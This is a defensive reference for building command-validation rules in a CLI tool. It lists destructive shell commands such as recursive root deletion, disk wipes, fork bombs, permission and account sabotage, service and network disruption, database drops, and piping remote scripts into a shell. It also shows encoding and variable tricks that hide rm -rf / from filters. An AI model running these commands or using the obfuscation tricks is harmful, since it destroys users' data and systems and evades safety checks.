# Dangerous Commands Reference

## Critical Risk Commands

### File System Destruction

#### Recursive Deletion
```bash
# Extremely dangerous - can delete entire system
rm -rf /
rm -rf /*
rm -rf ~
rm -rf $HOME
rm -rf .

# Dangerous with variables
rm -rf "$SOMEVAR"/*
rm -rf ${DIR}/*

# Force deletion
rm -f important_file
find . -delete
find / -name "*.log" -delete
```

#### Disk Operations
```bash
# Can destroy disk data
dd if=/dev/zero of=/dev/sda
dd if=/dev/random of=/dev/sda bs=1M
mkfs.ext4 /dev/sda1
fdisk /dev/sda

# Dangerous write operations
cat /dev/zero > /dev/sda
echo "data" > /dev/sda
```

### Permission Bombs
```bash
# Makes everything accessible to everyone
chmod -R 777 /
chmod -R 777 .
chmod -R 000 /
chown -R nobody:nobody /
```

### Fork Bombs
```bash
# Classic fork bomb - crashes system
:(){ :|:& };:
bomb() { bomb | bomb & }; bomb
```

### System Breaking
```bash
# Moves or removes critical directories
mv /usr/bin /usr/bin.bak
rm -rf /bin
rm -rf /boot
rm -rf /etc
mv /lib64 /lib64.old
```

## High Risk Commands

### Service Disruption
```bash
# Stops critical services
systemctl stop sshd
systemctl disable networking
service mysql stop
killall -9 sshd
pkill -9 -f systemd
```

### Network Disruption
```bash
# Breaks network connectivity
ifconfig eth0 down
ip link set eth0 down
iptables -F
iptables -P INPUT DROP
iptables -P OUTPUT DROP
route del default
```

### Package System Damage
```bash
# Can break package management
apt-get remove --purge libc6
yum remove glibc
rpm -e --nodeps glibc
dpkg --force-all --remove libc6
pip uninstall -y pip
npm uninstall -g npm
```

### User Account Issues
```bash
# Deletes users or changes passwords
userdel -r root
passwd -d root
usermod -L root
echo "root:newpass" | chpasswd
```

## Medium Risk Commands

### Data Overwrite
```bash
# Overwrites files without warning
cat source > important_file
echo "data" > config.conf
cp -f new_file important_file
mv -f source destination

# Truncates files
> important.log
: > database.sql
truncate -s 0 file.txt
```

### Bulk Operations
```bash
# Can affect many files
find / -type f -exec rm {} \;
find . -name "*.bak" -exec rm -f {} +
for f in /*; do rm "$f"; done
ls | xargs rm
```

### Archive Bombs
```bash
# Can fill disk or overwrite files
tar -xf archive.tar /
unzip -o archive.zip /
tar -czf / backup.tar.gz
```

### Remote Execution
```bash
# Executes unverified remote code
curl http://example.com/script.sh | bash
wget -O - http://example.com/install.sh | sh
ssh user@host "rm -rf /"
```

## Obfuscation Patterns

### Base64 Encoded
```bash
# Hidden dangerous commands
echo "cm0gLXJmIC8=" | base64 -d | bash
python -c "import base64; exec(base64.b64decode('...'))"
```

### Hex Encoded
```bash
# Hidden commands in hex
echo -e "\x72\x6d\x20\x2d\x72\x66\x20\x2f" | bash
xxd -r -p <<< "726d202d7266202f" | bash
```

### Character Manipulation
```bash
# Using special characters
r$'\155' -rf /
"r"m -rf /
\r\m -rf /
```

### Variable Expansion
```bash
# Hidden in variables
CMD="rm -rf"; $CMD /
X="r"; Y="m"; $X$Y -rf /
${RM:-rm} -rf /
```

## Context-Sensitive Dangers

### Git Repository
```bash
# In a git repo, these are dangerous
git reset --hard HEAD~10
git clean -fdx
git push --force
rm -rf .git
```

### Docker/Container
```bash
# Can break containers
docker rm -f $(docker ps -aq)
docker system prune -a -f
docker volume rm $(docker volume ls -q)
```

### Database Operations
```bash
# Can destroy databases
mysql -e "DROP DATABASE production;"
psql -c "DELETE FROM users;"
redis-cli FLUSHALL
mongo --eval "db.dropDatabase()"
```

## Safety Patterns to Implement

### 1. Path Analysis
- Check if path is system directory (/etc, /usr, /bin, etc.)
- Detect operations on parent directories (../)
- Identify operations on home directory (~, $HOME)

### 2. Command Chain Analysis
- Detect piping to shell interpreters (| bash, | sh)
- Identify command substitution with dangerous commands
- Check for multiple dangerous commands in sequence

### 3. Variable Expansion Safety
- Detect unquoted variable expansion with rm/dd/chmod
- Identify empty variable risks (${VAR}/* where VAR is empty)
- Check for command injection via variables

### 4. Permission Analysis
- Detect commands that require sudo/root
- Identify permission changes on system files
- Check for privilege escalation attempts

### 5. Network Safety
- Detect downloads from HTTP (not HTTPS)
- Identify execution of remote scripts
- Check for reverse shells

## Mitigation Strategies

### For Users
1. **Use --dry-run flags**: Many commands support dry-run mode
2. **Create backups**: Before dangerous operations
3. **Use trash instead of rm**: Install trash-cli
4. **Verify variables**: echo "$VAR" before using in dangerous commands
5. **Use read-only mounts**: For system directories when possible

### For Delta Implementation
1. **Require confirmation**: For high-risk commands
2. **Suggest alternatives**: Offer safer commands
3. **Show preview**: Display what will be affected
4. **Enable undo**: Keep temporary backups
5. **Log operations**: For audit trail

## False Positive Considerations

### Legitimate Uses
```bash
# These might be legitimate in certain contexts
rm -rf /tmp/build-*
chmod 777 /tmp/shared
find ./logs -name "*.old" -delete
```

### Context Matters
- Development environments vs. production
- User's home directory vs. system directories
- Temporary directories vs. permanent data
- Build/CI environments vs. regular usage

## Implementation Priority

1. **Critical**: Recursive root deletion, disk operations, fork bombs
2. **High**: Service disruption, network breaking, package removal
3. **Medium**: File overwrites, bulk operations, remote execution
4. **Low**: Non-destructive but potentially annoying commands

This reference should be used to build the pattern matching rules for the Delta CLI validation system.